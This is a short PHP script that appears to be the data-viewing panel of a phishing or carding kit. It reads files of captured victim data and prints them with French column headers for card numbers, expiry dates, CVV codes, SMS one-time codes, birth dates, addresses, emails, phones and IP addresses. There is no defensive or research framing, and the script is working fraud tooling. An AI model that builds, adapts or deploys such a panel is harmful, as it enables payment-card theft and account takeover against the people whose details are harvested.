<?php
$sectionFileMap = [
    'click'   => 'click',
    'cc'      => 'cards',
    'billing' => 'billing',
    'sms'     => 'otps',
    'info'    => 'info',
];

$sectionHeaders = [
    'click'   => "IP | ISP | Pays | OS | Date/Heure",
    'cards' => "Titulaire | Carte | Expiration | CVV | Prénom | Nom | Téléphone | Adresse | Adresse 2 | Ville | Email | IP | Date/Heure | type | bank | level",
    'billing' => "Prénom | Nom | Date de naissance | E-mail | Adresse | Adresse 2 | Code postal | Ville | Téléphone | IP | Date | Heure",
    'otps'     => "Téléphone | Code | IP | Date/Heure",
    'info'    => "Prénom | Nom | Date de naissance | E-mail | IP | Date | Heure",
];

$sectionId = $_GET['sectionId'] ?? '';

if (!isset($sectionFileMap[$sectionId])) {
    http_response_code(400);
    echo "Invalid section";
    exit;
}

$fileKey = $sectionFileMap[$sectionId];
$filePath = __DIR__ . "/data/{$fileKey}.txt";
$expectedHeader = $sectionHeaders[$fileKey] ?? '';

if (!file_exists($filePath)) {
    echo $expectedHeader . PHP_EOL;
    exit;
}

$content = @file_get_contents($filePath);
if ($content === false) {
    http_response_code(500);
    echo "Failed to read file: $filePath";
    exit;
}

echo $expectedHeader . PHP_EOL;
echo $content;
?>